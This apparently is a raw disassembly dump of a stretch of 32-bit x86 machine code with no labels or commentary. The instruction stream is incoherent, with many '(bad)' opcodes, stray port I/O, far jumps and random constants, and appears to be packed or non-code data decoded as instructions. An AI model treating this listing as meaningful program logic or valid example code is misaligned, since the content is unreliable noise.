  41f928:	ficom  DWORD PTR [ebx+0x7381a997]
  41f92e:	ret    0x7474
  41f931:	stc    
  41f932:	push   esi
  41f933:	pop    ds
  41f934:	push   ebp
  41f935:	nop
  41f936:	push   0x8ec46e57
  41f93b:	shl    edx,1
  41f93d:	pop    ds
  41f93e:	mov    BYTE PTR [edi-0x54],ch
  41f941:	scas   eax,DWORD PTR es:[edi]
  41f942:	nop
  41f943:	push   0xded4a5af
  41f948:	push   es
  41f949:	aaa    
  41f94a:	and    DWORD PTR [ebx],edx
  41f94c:	or     edx,esp
  41f94e:	js     0x41f944
  41f950:	or     al,0x5b
  41f952:	rol    ch,1
  41f954:	mov    ecx,esi
  41f956:	sbb    eax,0xe86ef954
  41f95c:	cmp    DWORD PTR [eax],0xffffffb8
  41f95f:	(bad)  
  41f960:	cwde   
  41f961:	ja     0x41f90a
  41f963:	dec    esp
  41f964:	cmp    DWORD PTR [eax],esi
  41f966:	push   ebx
  41f967:	jge    0x41f921
  41f969:	push   eax
  41f96a:	and    al,0x94
  41f96c:	inc    ecx
  41f96d:	lds    edx,FWORD PTR [edi+0x2ebffe07]
  41f973:	retf   0x6b76
  41f976:	jmp    0x9a7d:0xefd5e78d
  41f97d:	idiv   BYTE PTR [ecx-0x2bc38bb3]
  41f983:	inc    ebx
  41f984:	rcr    DWORD PTR ds:0x65b8c4c4,cl
  41f98a:	(bad)  
  41f98b:	and    bh,BYTE PTR [edi-0x71]
  41f98e:	or     bh,BYTE PTR [esi+0x76ce5c65]
  41f994:	adc    bl,BYTE PTR [esi]
  41f996:	sar    DWORD PTR [ecx-0x60],1
  41f999:	in     eax,dx
  41f99a:	push   ecx
  41f99b:	sahf   
  41f99c:	pop    eax
  41f99d:	cmp    eax,0x2cefbecb
  41f9a2:	ins    DWORD PTR es:[edi],dx
  41f9a3:	pop    ecx
  41f9a4:	jle    0x41f9b2
  41f9a6:	fdivr  QWORD PTR [edx-0x42da9cd5]
  41f9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9ad:	sti    
  41f9ae:	daa    
  41f9af:	xchg   esi,eax
  41f9b0:	out    dx,al
  41f9b1:	pusha  
  41f9b2:	xor    edi,DWORD PTR [eax+edx*2+0x4d9bac0c]
  41f9b9:	ja     0x41f97b
  41f9bb:	call   0x218fea6e
  41f9c0:	pop    ebp
  41f9c1:	(bad)  
  41f9c2:	out    dx,al
  41f9c3:	out    0x6d,eax
  41f9c5:	ss loope 0x41fa32
  41f9c8:	jmp    FWORD PTR [ebx]
  41f9ca:	cli    
  41f9cb:	and    eax,0x5b2feb96
  41f9d0:	fidivr DWORD PTR [eax-0x26]
  41f9d3:	ret    
  41f9d4:	cmp    BYTE PTR [ebx],ch
  41f9d6:	dec    edx
  41f9d7:	xlat   BYTE PTR ds:[ebx]
  41f9d8:	repnz push ebp
  41f9da:	pop    eax
  41f9db:	xchg   ebp,eax
  41f9dc:	ja     0x41f9f6
  41f9de:	cmp    dl,BYTE PTR [edx-0x25]
  41f9e1:	clc    
  41f9e2:	mov    ds:0x4d564779,al
  41f9e7:	je     0x41f97f
  41f9e9:	sub    ebp,edx
  41f9eb:	jl     0x41fa51
  41f9ed:	mov    ecx,0xa741b6d4
  41f9f2:	call   0xa1b1:0xc21c745c
  41f9f9:	jae    0x41f99f
  41f9fb:	or     eax,ecx
  41f9fd:	mov    al,ds:0xc56325a2
  41fa02:	(bad)  
  41fa03:	aad    0x4
  41fa05:	pop    ds
  41fa06:	sbb    DWORD PTR [edi+eax*8+0x332b2d33],ecx
  41fa0d:	mov    WORD PTR [esi-0x60dfedc0],ds
  41fa13:	jae    0x41fa8d
  41fa15:	in     eax,dx
  41fa16:	mov    dl,0xcb
  41fa18:	retf   0xb46
  41fa1b:	outs   dx,BYTE PTR ds:[esi]
  41fa1c:	stc    
  41fa1d:	retf   0x5c01
  41fa20:	add    BYTE PTR [edx-0x3],al
  41fa23:	xor    eax,0x273e07f
  41fa28:	xor    cl,cl
  41fa2a:	pop    edi
  41fa2b:	xchg   ebp,eax
  41fa2c:	fs add eax,esp
  41fa2f:	adc    DWORD PTR [eax-0x3ad6e3a0],ebp
  41fa35:	mov    al,0x3d
  41fa37:	aaa    
  41fa38:	fs push edx
  41fa3a:	adc    al,0x10
  41fa3d:	in     al,0x6a
  41fa3f:	loopne 0x41fa4e
  41fa41:	cmp    eax,0xc66ece35
  41fa46:	xchg   esi,eax
  41fa47:	popf   
  41fa48:	ja     0x41fa55
  41fa4a:	push   ds
  41fa4b:	hlt    
  41fa4c:	add    al,0x60
  41fa4e:	fwait
  41fa4f:	adc    dl,BYTE PTR [edx]
  41fa51:	test   eax,0x9ae18345
  41fa56:	mov    ds:0xc16b4e0e,eax
  41fa5b:	push   ebp
  41fa5c:	jecxz  0x41fab4
  41fa5e:	aas    
  41fa5f:	adc    ebx,DWORD PTR [edi-0x46f27d95]
  41fa65:	sub    eax,DWORD PTR [esi+eiz*1-0x6a39b861]
  41fa6c:	xor    al,0xac
  41fa6e:	icebp  
  41fa6f:	retf   
  41fa70:	sbb    eax,0x1a0b27df
  41fa75:	mov    ds:0xcf5eda71,al
  41fa7a:	mov    ebx,0x43a832ad
  41fa7f:	sub    ebx,DWORD PTR [esi+0x3]
  41fa82:	xor    BYTE PTR [eax],bh
  41fa84:	ss enter 0xa3b0,0x72
  41fa89:	je     0x41fa90
  41fa8b:	jne    0x41fa77
  41fa8d:	fisub  DWORD PTR [eax+edi*8-0x26]
  41fa91:	pop    edi
  41fa92:	jl     0x41faa5
  41fa94:	xchg   edx,eax
  41fa95:	mov    BYTE PTR [ecx],bl
  41fa97:	xor    al,0x9f
  41fa99:	xchg   ebp,eax
  41fa9a:	and    dl,BYTE PTR [ecx+0x505731dd]
  41faa0:	ss pop es
  41faa2:	and    dh,bl
  41faa4:	pop    es
  41faa5:	jmp    0x41fa58
  41faa7:	pop    es
  41faa8:	shl    DWORD PTR [edi],cl
  41faaa:	test   DWORD PTR [edx+0x4265fcb5],0x2cf2408b
  41fab4:	in     eax,dx
  41fab5:	iret   
  41fab6:	int3   
  41fab7:	xor    ecx,DWORD PTR [edi-0x5463f2d1]
  41fabd:	retf   0x9c39
  41fac0:	jecxz  0x41fadd
  41fac2:	cs repnz mov dl,0x72
  41fac6:	cs push eax
  41fac8:	xchg   esp,eax
  41fac9:	fs cmp ebx,edx
  41facc:	test   BYTE PTR [ebx],dl
  41face:	cmp    BYTE PTR [ebx],cl
  41fad0:	dec    ecx
  41fad1:	sub    BYTE PTR [ebx],ah
  41fad3:	bnd ja 0x41fac9
  41fad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fad7:	jle    0x41fa70
  41fad9:	ja     0x41fb47
  41fadb:	sti    
  41fadc:	in     al,0x52
  41fade:	jp     0x41fa62
  41fae0:	imul   ebp,DWORD PTR [edx],0xffffff9e
  41fae3:	push   edi
  41fae4:	add    esp,DWORD PTR [ecx+0x20b9cae1]
  41faea:	and    DWORD PTR [edi+0x8715aa4],ecx
  41faf0:	outs   dx,BYTE PTR ds:[esi]
  41faf1:	ficom  DWORD PTR [edi]
  41faf3:	sbb    ah,ch
  41faf5:	shr    BYTE PTR [eax-0x145cefc9],1
  41fafb:	mov    cl,0x7d
  41fafd:	and    al,0x90
  41faff:	lock xor ah,BYTE PTR [ebx+0x350508db]
  41fb06:	xchg   al,dh
  41fb08:	push   0x232f21ab
  41fb0d:	adc    ah,BYTE PTR [edi-0x73c2288a]
  41fb13:	gs stos DWORD PTR es:[edi],eax
  41fb15:	and    BYTE PTR [ecx+0x7b8941cc],al
  41fb1b:	iret   
  41fb1c:	mov    ah,0x2
  41fb1e:	dec    ebp
  41fb1f:	ret    0x4cbf
  41fb22:	jo     0x41fadc
  41fb24:	into   
  41fb25:	retf   0xeacc
  41fb28:	jns    0x41fb3d
  41fb2a:	mov    esi,0x8d40dcdc
  41fb2f:	xchg   DWORD PTR [ebx-0x53d8144],ebp
  41fb35:	(bad)  
  41fb36:	fcomi  st,st(4)
  41fb38:	jg     0x41fb65
  41fb3a:	xor    bl,BYTE PTR [ebx-0x76]
  41fb3d:	mov    bl,0x72
  41fb3f:	dec    ebp
  41fb40:	(bad)  
  41fb41:	cmp    eax,0x56c85aeb
  41fb46:	loope  0x41fb0a
  41fb48:	adc    dh,ch
  41fb4a:	jmp    0xc3f:0xefd24828
  41fb51:	imul   eax,eax,0xffffff8a
  41fb54:	scas   al,BYTE PTR es:[edi]
  41fb55:	mov    ah,0x96
  41fb57:	xchg   edi,eax
  41fb58:	in     al,dx
  41fb59:	adc    cl,dl
  41fb5b:	outs   dx,DWORD PTR ds:[esi]
  41fb5c:	mov    ss,WORD PTR [ecx-0x6d]
  41fb5f:	neg    bl
  41fb61:	jbe    0x41fb4a
  41fb63:	push   ebx
  41fb64:	add    al,BYTE PTR [ecx-0x35322ef9]
  41fb6a:	fucomip st,st(2)
  41fb6c:	inc    ebx
  41fb6d:	(bad)  
  41fb6f:	inc    ebp
  41fb70:	jbe    0x41fb87
  41fb72:	cmc    
  41fb73:	cld    
  41fb74:	clc    
  41fb75:	push   ebx
  41fb76:	mov    dh,BYTE PTR [ecx-0x1f]
  41fb79:	fld    TBYTE PTR [esi+0x3c]
  41fb7c:	jp     0x41fb29
  41fb7e:	(bad)  
  41fb7f:	adc    al,0x11
  41fb81:	sub    al,0xa7
  41fb83:	in     eax,dx
  41fb84:	scas   al,BYTE PTR es:[edi]
  41fb85:	mov    ecx,DWORD PTR [ecx+0x43]
  41fb88:	pop    edx
  41fb89:	dec    ebp
  41fb8a:	jo     0x41fbb7
  41fb8c:	cmp    al,0x7e
  41fb8e:	sbb    eax,ebp
  41fb90:	mov    bl,0x69
  41fb92:	fs (bad) 
  41fb94:	xor    DWORD PTR [eax],esi
  41fb96:	push   ecx
  41fb97:	sbb    DWORD PTR [ebx],ecx
  41fb99:	push   esp
  41fb9a:	int3   
  41fb9b:	add    DWORD PTR [esi],ebp
  41fb9d:	call   0x99f5:0xb96ac6c9
  41fba4:	dec    esp
  41fba5:	loopne 0x41fba6
  41fba7:	test   ecx,esi
  41fba9:	and    edi,0x2238df37
  41fbaf:	sbb    eax,0x296ee6a8
  41fbb4:	sbb    eax,0x36e28e92
  41fbb9:	inc    eax
  41fbba:	cmp    eax,0x86aefbd7
  41fbbf:	movsx  ebp,bh
  41fbc2:	and    DWORD PTR [eax+0x39],edx
  41fbc5:	lods   al,BYTE PTR ds:[esi]
  41fbc6:	stos   DWORD PTR es:[edi],eax
  41fbc7:	loop   0x41fc2e
  41fbc9:	inc    esi
  41fbca:	inc    esp
  41fbcb:	jge    0x41fc41
  41fbcd:	jnp    0x41fb92
  41fbcf:	scas   eax,DWORD PTR es:[edi]
  41fbd0:	dec    ecx
  41fbd1:	jo     0x41fb8c
  41fbd3:	mov    bh,BYTE PTR [edx+0x49a43f79]
  41fbd9:	cmp    BYTE PTR [ebx-0x46dc8c00],cl
  41fbdf:	and    ah,0xb4
  41fbe2:	mov    ds:0x46203f61,al
  41fbe7:	cdq    
  41fbe8:	add    DWORD PTR [esi-0x57],0x30e292ed
  41fbef:	leave  
  41fbf0:	add    ch,BYTE PTR [ebx+ebx*8-0x5]
  41fbf4:	mov    BYTE PTR [esi-0x6c125e4d],dl
  41fbfa:	(bad)  [eax]
  41fbfc:	aas    
  41fbfd:	xchg   esi,eax
  41fbfe:	pop    ecx
  41fbff:	mov    cl,0xf1
  41fc01:	cld    
  41fc02:	adc    eax,0x708e6da7
  41fc07:	mov    ebp,0xd2442826
  41fc0c:	sbb    cl,BYTE PTR [ecx+edi*2]
  41fc0f:	lods   eax,DWORD PTR ds:[esi]
  41fc10:	outs   dx,BYTE PTR ds:[esi]
  41fc11:	dec    edi
  41fc12:	test   DWORD PTR [ecx+0x642b3729],ebx
  41fc18:	inc    edi
  41fc19:	ins    BYTE PTR es:[edi],dx
  41fc1a:	add    al,0x22
  41fc1c:	ja     0x41fbf0
  41fc1e:	ret    0xaf7b
  41fc21:	mov    dh,0x44
  41fc23:	jmp    0x41fbc3
  41fc25:	jle    0x41fca4
  41fc27:	mov    ds:0x7af7d666,eax
  41fc2c:	ins    DWORD PTR es:[edi],dx
  41fc2d:	stos   DWORD PTR es:[edi],eax
  41fc2e:	xchg   esi,eax
  41fc2f:	or     BYTE PTR [ebp-0x36077a61],cl
  41fc35:	aaa    
  41fc36:	cdq    
  41fc37:	adc    al,0xdd
  41fc39:	jno    0x41fbd9
  41fc3b:	pop    esp
  41fc3c:	sbb    DWORD PTR [edx+0x2f],edi
  41fc3f:	mov    ebp,ebx
  41fc41:	test   al,0x9
  41fc43:	fs in  eax,dx
  41fc45:	call   DWORD PTR [ebx+ecx*1+0x54]
  41fc49:	jle    0x41fc08
  41fc4b:	clc    
  41fc4c:	mov    fs,ebx
  41fc4e:	mov    ch,BYTE PTR [edi+0x61fcde34]
  41fc54:	pop    ss
  41fc55:	xchg   esp,eax
  41fc56:	in     eax,0xf5
  41fc58:	xchg   ebx,eax
  41fc59:	jg     0x41fc78
  41fc5b:	and    DWORD PTR [ecx+0x468bed19],0x7298aa15
  41fc65:	shl    DWORD PTR [esi-0x7148df32],cl
  41fc6b:	and    BYTE PTR [edi+0x71500dea],ah
  41fc71:	out    dx,eax
  41fc72:	xor    al,0x51
  41fc74:	dec    ebp
  41fc75:	xor    DWORD PTR [ebp-0x4c],ecx
  41fc78:	mov    ds,esi
  41fc7a:	test   BYTE PTR [edx],0x44
  41fc7d:	sub    BYTE PTR [ebx],dh
  41fc7f:	outs   dx,BYTE PTR ds:[esi]
  41fc80:	sar    esp,0x52
  41fc83:	pop    ebx
  41fc84:	ds js  0x41fc9f
  41fc87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc88:	jp     0x41fca5
  41fc8a:	and    dl,cl
  41fc8c:	test   eax,0x62e805cd
  41fc91:	hlt    
  41fc92:	or     eax,0x180a53f1
  41fc97:	out    0x2f,al
  41fc99:	aam    0x44
  41fc9b:	mov    bh,0xbb
  41fc9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc9e:	icebp  
  41fc9f:	sti    
  41fca0:	ret    
  41fca1:	retf   0x3ebb
  41fca4:	out    dx,al
  41fca5:	xchg   ebx,eax
  41fca6:	xor    ebp,ecx
  41fca8:	mov    WORD PTR [esi],?
  41fcaa:	popf   
  41fcab:	fmul   QWORD PTR [eax-0x71]
  41fcae:	neg    BYTE PTR [eax]
  41fcb0:	mov    bl,0x52
  41fcb2:	test   DWORD PTR [ebp+0x398a5326],0x8f2b3038
  41fcbc:	sbb    edx,eax
  41fcbe:	mov    edi,0x7f6b47d7
  41fcc3:	rol    DWORD PTR [ebx+eax*8],cl
  41fcc6:	lock dec esi
  41fcc8:	and    eax,0x651959d6
  41fccd:	or     ebp,ebp
  41fccf:	stos   DWORD PTR es:[edi],eax
  41fcd0:	adc    DWORD PTR ds:0x2b8848bf,ecx
  41fcd7:	sbb    al,0xf6
  41fcd9:	lods   al,BYTE PTR ds:[esi]
  41fcda:	aas    
  41fcdb:	xor    ecx,DWORD PTR [eax-0x258741b2]
  41fce1:	push   ebx
  41fce2:	jae    0x41fd38
  41fce4:	sub    edi,edx
  41fce6:	outs   dx,BYTE PTR ds:[esi]
  41fce7:	mov    dl,dl
  41fce9:	aam    0xed
  41fceb:	adc    DWORD PTR [eax-0x3b29182],0x55
  41fcf2:	xor    al,0x1f
  41fcf4:	push   es
  41fcf5:	(bad)  
  41fcf6:	sbb    al,0xc5
  41fcf8:	das    
  41fcf9:	scas   eax,DWORD PTR es:[edi]
  41fcfa:	mov    ch,0x79
  41fcfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcfd:	mov    dh,0x67
  41fcff:	clc    
  41fd00:	sub    eax,0x7af82b84
  41fd05:	pusha  
  41fd06:	adc    ebp,DWORD PTR [eax+0x1432e634]
  41fd0c:	ins    DWORD PTR es:[edi],dx
  41fd0d:	mov    cl,0xb1
  41fd0f:	call   0x85c337eb
  41fd14:	out    dx,eax
  41fd15:	test   DWORD PTR [ecx],esp
  41fd17:	mov    ds:0x1c409432,eax
  41fd1c:	mov    edi,0xe64c8dd1
  41fd21:	lahf   
  41fd22:	mov    al,0x54
  41fd24:	push   ss
  41fd25:	cmp    al,0xf2
  41fd27:	test   eax,0x7259c490
  41fd2c:	or     DWORD PTR [eax-0x6fff9a6d],edi
  41fd32:	int    0xe5
  41fd34:	add    DWORD PTR [edx-0x60],edx
  41fd37:	or     ecx,edi
  41fd39:	or     al,0x3c
  41fd3b:	push   edi
  41fd3c:	fadd   DWORD PTR [eax]
  41fd3e:	add    BYTE PTR [eax],al
  41fd40:	add    BYTE PTR [eax],al
  41fd42:	mov    ds:0xb713b617,al
  41fd47:	mov    bl,0xa7
  41fd49:	mov    bh,0xb
  41fd4b:	add    BYTE PTR [edi-0x4f1c9824],dh
  41fd51:	test   eax,0x177cc
  41fd56:	repz add al,0x0
  41fd59:	add    BYTE PTR [ebx+0x19cf49aa],bh
  41fd5f:	jo     0x41fd1a
  41fd61:	xchg   BYTE PTR [ebx+0x64],bh
  41fd64:	or     al,0x6d
  41fd66:	adc    edi,edi
  41fd68:	(bad)  
  41fd69:	jb     0x41fd3e
  41fd6b:	out    dx,al
  41fd6c:	ds ins DWORD PTR es:[edi],dx
  41fd6e:	call   0x9925:0x5521de3e
  41fd75:	pop    es
  41fd76:	mov    bh,0x67
  41fd78:	xchg   edx,eax
  41fd79:	and    edi,DWORD PTR [ebx-0x6]
  41fd7c:	mov    esp,0x76e1c8d8
  41fd81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd82:	mov    edi,0xec6be19f
  41fd87:	mov    bl,0xd6
  41fd89:	cmp    DWORD PTR [ecx-0x63b17311],edi
  41fd8f:	ret    0xcc54
  41fd92:	dec    edx
  41fd93:	jecxz  0x41fd54
  41fd95:	mov    ebx,0xcdbd5762
  41fd9a:	pop    esp
  41fd9b:	jbe    0x41fda5
  41fd9d:	sub    cl,BYTE PTR [ebx+0x76]
  41fda0:	lahf   
  41fda1:	stos   BYTE PTR es:[edi],al
  41fda2:	sbb    DWORD PTR [esi+0x68],ebp
  41fda5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fda6:	in     eax,dx
  41fda7:	sub    dl,BYTE PTR [ebp+0x728979c]
  41fdad:	es popf 
  41fdaf:	mov    DWORD PTR [edx+0x485bf668],esp
  41fdb5:	inc    edi
  41fdb6:	shl    DWORD PTR ds:0xd1986e63,1
  41fdbc:	sbb    BYTE PTR [eax],ch
  41fdbe:	sub    al,0xe5
  41fdc0:	inc    ebx
  41fdc1:	mov    DWORD PTR [ebx-0xc11f4ed],eax
  41fdc7:	lea    ebx,ds:0x8debe4d4
  41fdcd:	sub    DWORD PTR [esi],esi
  41fdcf:	imul   ebx,DWORD PTR [ebx+0x42],0x5b0c2c86
  41fdd6:	jg     0x41fd62
  41fdd8:	aam    0x21
  41fdda:	psadbw mm3,QWORD PTR [ecx]
  41fddd:	sub    eax,0xc7a6de25
  41fde2:	sbb    al,0x2c
  41fde4:	test   DWORD PTR [edi+ebx*4+0x6f],ebp
  41fde8:	sub    eax,0xabf6daf9
  41fded:	push   ebx
  41fdee:	adc    DWORD PTR [edi+0x75ec940],eax
  41fdf4:	ror    DWORD PTR [ebx],0x59
  41fdf7:	arpl   bp,si
  41fdf9:	pop    edx
  41fdfa:	data16 mov al,0x17
  41fdfd:	sbb    BYTE PTR [edi+0x2c],ah
  41fe00:	out    dx,al
  41fe01:	clc    
  41fe02:	cmp    eax,0xa2db3272
  41fe07:	cs jmp 0x493f9929
  41fe0d:	repz xchg ebx,eax
  41fe0f:	test   BYTE PTR [edx],al
  41fe11:	or     BYTE PTR [edx],bh
  41fe13:	call   0x16eaab54
  41fe18:	push   esp
  41fe19:	xor    DWORD PTR ds:0x1e3120bc,eax
  41fe1f:	(bad)  
  41fe20:	fisttp DWORD PTR [ecx]
  41fe22:	or     cl,ch
  41fe24:	inc    edx
  41fe25:	sbb    BYTE PTR [esi],bh
  41fe27:	shl    DWORD PTR [edi-0x21],0x64
  41fe2b:	or     BYTE PTR [ecx+ebx*8+0x5ead0fa2],ch
  41fe32:	sub    eax,0x56b2d077
  41fe37:	leave  
  41fe38:	cmp    dh,dl
  41fe3a:	aas    
  41fe3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe3c:	aam    0x1d
  41fe3e:	pop    esi
  41fe3f:	daa    
  41fe40:	pop    ss
  41fe41:	pushw  cs
  41fe43:	mov    dh,BYTE PTR [esi+0x2b857093]
  41fe49:	mov    ch,0xfb
  41fe4b:	arpl   dx,di
  41fe4d:	inc    ebp
  41fe4e:	inc    ecx
  41fe4f:	mov    al,ds:0xe1301eda
  41fe54:	mov    bl,0x93
  41fe56:	mov    DWORD PTR [ecx],edi
  41fe58:	jge    0x41fe49
  41fe5a:	xchg   ebp,eax
  41fe5b:	push   esi
  41fe5c:	(bad)  
  41fe5d:	rol    DWORD PTR [ebp-0x3a703abf],0xe
  41fe64:	test   eax,0xf41a1c7b
  41fe69:	mov    edx,0x4736b063
  41fe6e:	mov    ah,0xeb
  41fe70:	xchg   esp,eax
  41fe71:	jne    0x41fe62
  41fe73:	into   
  41fe74:	repnz stc 
  41fe76:	pop    ecx
  41fe77:	shl    BYTE PTR [ebx+0x5c],0xaf
  41fe7b:	call   0x6e63fdb5
  41fe80:	jno    0x41fe4d
  41fe82:	out    dx,eax
  41fe83:	int    0x9e
  41fe85:	cmp    edi,DWORD PTR [edx-0x5d]
  41fe88:	inc    edi
  41fe89:	call   0x28f:0x99d90292
  41fe90:	shl    DWORD PTR [esi+edx*1+0x6aa8f4e6],0xe5
  41fe98:	jmp    0x41fe27
  41fe9a:	ror    ah,cl
  41fe9c:	mov    ch,0x59
  41fe9e:	shl    edx,0x4b
  41fea1:	(bad)
  41fea5:	call   0x899d:0x96a10731
  41feac:	xor    BYTE PTR [ebp-0x53e75e30],0xf6
  41feb3:	imul   eax,ebp,0x6ab9fe71
  41feb9:	(bad)  [edx-0x3e34b21]
  41febf:	ss popf 
  41fec1:	jne    0x41ff04
  41fec3:	mov    dh,0x76
  41fec5:	mov    ds:0x40fb993c,eax
  41feca:	cli    
  41fecb:	push   ecx
  41fecc:	shl    DWORD PTR [ebx-0x4b],0xb6
  41fed0:	dec    esp
  41fed1:	and    bl,BYTE PTR [ebp-0x58]
  41fed4:	jo     0x41fefe
  41fed6:	dec    ebx
  41fed7:	es shl edi,1
  41feda:	lea    esp,[eax]
  41fedc:	and    BYTE PTR [eax+ebp*4+0x7b],ah
  41fee0:	fcomi  st,st(2)
  41fee2:	jg     0x41fea3
  41fee4:	cs inc edi
  41fee6:	popf   
  41fee7:	xchg   esp,eax
  41fee8:	cmp    eax,0xd30b4597
  41feed:	lods   eax,DWORD PTR ds:[esi]
  41feee:	fdivr  DWORD PTR [ebx+0x2535bf3d]
  41fef4:	add    eax,0xb6238b5
  41fef9:	and    eax,0x96563f80
  41fefe:	test   eax,0xb8fc4ae6
  41ff03:	sti    
  41ff04:	in     al,dx
  41ff05:	pop    es
  41ff06:	xor    eax,0x38e6ae99
  41ff0b:	fild   WORD PTR [eax+0x69f4c4da]
  41ff11:	pop    esp
  41ff12:	mov    bl,0xf0
  41ff14:	scas   al,BYTE PTR es:[edi]
  41ff15:	pop    ebp
  41ff16:	xor    al,0x75
  41ff18:	push   ds
  41ff19:	push   ecx
  41ff1a:	xor    eax,0x7fbaf96
  41ff1f:	popa   
  41ff20:	daa    
  41ff21:	bnd jne 0x41feb0
  41ff24:	(bad)  
  41ff25:	in     eax,dx
  41ff26:	mov    dl,0x24
  41ff28:	mov    ds:0xacf8e942,eax
  41ff2d:	sub    ebp,DWORD PTR [esi+0x58facf16]
  41ff33:	sti    
  41ff34:	mov    bl,0x23
  41ff36:	test   ecx,ebx
  41ff38:	sbb    ch,0x2a
  41ff3b:	jnp    0x41feea
  41ff3d:	push   ss
  41ff3e:	xor    al,0x8c
  41ff40:	enter  0x91a0,0x40
  41ff44:	enter  0xcb41,0xe4
  41ff48:	repnz xor DWORD PTR [edx],eax
  41ff4b:	mov    bl,BYTE PTR [ebx-0x5e]
  41ff4e:	jp     0x41ffa1
  41ff50:	retf   
  41ff51:	ret    
  41ff52:	aad    0xaf
  41ff54:	pop    eax
  41ff55:	out    0xa3,eax
  41ff57:	jl     0x41ff08
  41ff59:	inc    ebx
  41ff5a:	mov    al,0x32
  41ff5c:	clc    
  41ff5d:	jp     0x41fef5
  41ff5f:	dec    esp
  41ff60:	push   ebp
  41ff61:	mov    BYTE PTR [ecx+0x6f],ah
  41ff64:	jbe    0x41ff3e
  41ff66:	mov    al,ds:0x8581d1a6
  41ff6b:	(bad)  
  41ff6c:	in     al,0x74
  41ff6e:	pop    ebp
  41ff6f:	jb     0x41fef1
  41ff71:	in     al,dx
  41ff72:	lods   al,BYTE PTR ds:[si]
  41ff74:	js     0x41ff80
  41ff76:	add    BYTE PTR [edx-0x41],bl
  41ff79:	shl    DWORD PTR [esi-0x63],0xf8
  41ff7d:	not    DWORD PTR ds:0x66b8acb
  41ff83:	mov    ecx,0xee23e706
  41ff88:	in     eax,dx
  41ff89:	add    edx,DWORD PTR ds:0xe1c9b563
  41ff8f:	test   eax,0x4270cd79
  41ff94:	stc    
  41ff95:	std    
  41ff96:	in     al,0x24
  41ff98:	addr16 push ds
  41ff9a:	jno    0x42000b
  41ff9c:	adc    BYTE PTR [ebx],ch
  41ff9e:	fwait
  41ff9f:	test   BYTE PTR [ebp-0x7e],0x34
  41ffa3:	pusha  
  41ffa4:	loop   0x420008
  41ffa6:	mov    dl,0x77
  41ffa8:	pop    ebp
  41ffa9:	arpl   di,ax
  41ffab:	je     0x420001
  41ffad:	or     eax,0x5a2f8663
  41ffb2:	std    
  41ffb3:	xchg   ebx,eax
  41ffb4:	push   ds
  41ffb5:	mov    al,0x52
  41ffb7:	ins    BYTE PTR es:[edi],dx
  41ffb8:	inc    eax
  41ffb9:	dec    ecx
  41ffba:	arpl   WORD PTR [ecx+0x6e],si
  41ffbd:	out    0xe7,al
  41ffbf:	mov    edx,ebx
  41ffc1:	mov    ah,0x97
  41ffc3:	shr    DWORD PTR [edx+0x5],cl
  41ffc6:	les    edx,FWORD PTR [ecx+0x49]
  41ffc9:	loopne 0x41ffaf
  41ffcb:	push   esi
  41ffcc:	aad    0xc1
  41ffce:	(bad)  
  41ffcf:	dec    esp
  41ffd0:	mov    ebx,0xbf08bcee
  41ffd5:	mov    esi,DWORD PTR [edi-0x4b2fa9c2]
  41ffdb:	sbb    al,0x92
  41ffdd:	mov    WORD PTR ds:0x605f439a,?
  41ffe3:	fbstp  TBYTE PTR [edi-0x314dd8c2]
  41ffe9:	add    BYTE PTR [ebx-0x4c1da41c],ah
  41ffef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fff0:	dec    ebp
  41fff1:	xchg   eax,edx
  41fff3:	add    DWORD PTR [ebp+0x3b],ebp
  41fff6:	jge    0x420076
  41fff8:	jmp    0xd778:0xf5825590
  41ffff:	out    0xb0,al
  420001:	and    DWORD PTR [esi+esi*1-0x4a7ed821],edx
  420008:	mov    ebp,0xd359e588
  42000d:	leave  
  42000e:	mov    ecx,0xc0d4a1ea
  420013:	pop    ebx
  420014:	jecxz  0x420084
  420016:	hlt    
  420017:	push   0x12
  420019:	es mov dl,0xb7
  42001c:	lods   al,BYTE PTR ds:[esi]
  42001d:	mov    ecx,0x1e732a19
  420022:	ret    0xab48
  420025:	jp     0x41ffd8
  420027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420028:	sbb    dl,bh
  42002a:	xchg   ecx,eax
  42002b:	popf   
  42002c:	int    0x53
  42002e:	lea    ebx,[ebx]
  420030:	das    
  420031:	ja     0x420000
  420033:	xchg   edx,eax
  420034:	cmp    DWORD PTR [ecx+0xa],edi
  420037:	and    ebp,DWORD PTR [edx+0x45]
  42003a:	test   BYTE PTR [eax-0x1f22eef2],ah
  420040:	mov    ds:0x529d7f5e,al
  420045:	xor    edi,ecx
  420047:	inc    edi
  420048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420049:	jne    0x4200c3
  42004b:	sbb    edx,DWORD PTR [ebp-0x77]
  42004e:	enter  0x2b67,0xb5
  420052:	mov    BYTE PTR [edi-0x3b06c284],ch
  420058:	jg     0x42000a
  42005a:	mov    cl,0xf9
  42005c:	das    
  42005d:	shr    ah,1
  42005f:	outs   dx,DWORD PTR ds:[esi]
  420060:	into   
  420061:	arpl   bp,ax
  420063:	xchg   esi,eax
  420064:	sahf   
  420065:	jp     0x42001d
  420067:	das    
  420068:	dec    edi
  420069:	mov    dh,0x18
  42006b:	cmp    DWORD PTR [esi-0x4e898ecd],0x7e
  420072:	das    
  420073:	aam    0x62
  420075:	(bad)  
  420077:	sub    ebx,DWORD PTR [ebx-0x655d7208]
  42007d:	ret    0x7f57
  420080:	jns    0x420090
  420082:	clc    
  420083:	retf   
  420084:	jns    0x420035
  420086:	mov    edi,0x1b61588e
  42008b:	sub    DWORD PTR [edi+eiz*1],ebp
  42008e:	mov    ecx,0x9e6990b9
  420093:	std    
  420094:	sbb    dh,BYTE PTR [ebx+0x36]
  420097:	shl    DWORD PTR [edx+0x76],cl
  42009a:	xchg   ecx,eax
  42009b:	sbb    cl,BYTE PTR [ecx+0x75]
  42009e:	xchg   ebx,eax
  42009f:	(bad)  
  4200a0:	popf   
  4200a1:	icebp  
  4200a2:	dec    dx
  4200a4:	popa   
  4200a5:	retf   
  4200a6:	and    al,0x76
  4200a8:	mov    dh,0x59
